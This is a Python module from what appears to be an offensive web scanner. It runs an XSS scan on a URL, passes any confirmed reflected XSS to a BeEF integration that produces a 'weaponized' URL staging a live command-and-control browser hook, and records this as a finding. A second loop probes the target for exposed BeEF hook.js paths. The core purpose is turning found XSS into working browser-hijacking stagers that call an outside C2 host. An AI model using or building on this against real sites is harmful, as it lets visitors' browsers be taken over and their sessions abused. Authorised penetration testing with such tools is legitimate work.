"""Man-in-the-Browser (MitB) / BeEF-style browser exploitation scanner & live hook integration."""
import urllib.parse
from core.http import get
from core.findings import Finding
from core.memory import log_event
from tools.beef import handoff_xss_to_beef


def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    from scan.xss import scan_url as xss_scan

    xss_findings = xss_scan(url)
    if xss_findings:
        beef = handoff_xss_to_beef(url, param=xss_findings[0].parameter, finding_id=xss_findings[0].id)
        best = beef.get("best_stager", {})
        findings.append(Finding(
            id=f"mitb-capability-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="Man-in-the-Browser (MitB) Hookable XSS",
            severity="high",
            url=best.get("weaponized_url", url),
            parameter=xss_findings[0].parameter or "xss",
            payload=best.get("payload", ""),
            evidence=f"Reflected XSS confirmed & staged with live BeEF C2 hook ({beef.get('hook_url')})",
            response_snippet=xss_findings[0].response_snippet,
            confidence=0.85,
            detected_by="hunter:mitb",
            escalated_with=["beef_hook"],
            beef_hook_url=beef.get("hook_url", ""),
        ))

    for path in ["/hook.js", "/beef/hook.js", "/browser/hook.js"]:
        r = get(f"{parsed.scheme}://{parsed.netloc}{path}")
        if r.status == 200 and ("beef" in (r.text or "").lower() or "beef_hook" in (r.text or "").lower()):
            findings.append(Finding(
                id=f"beef-hook-{hash(url) & 0xffff:x}",
                target=parsed.netloc,
                type="BeEF Hook Endpoint Exposed",
                severity="high",
                url=f"{parsed.scheme}://{parsed.netloc}{path}",
                parameter="path",
                payload=path,
                evidence="Third-party BeEF hook script publicly accessible on target",
                response_snippet=r.snippet(200),
                confidence=0.9,
                detected_by="hunter:mitb",
            ))

    log_event(parsed.netloc, "mitb_scan", {"url": url, "findings": len(findings)})
    return findings
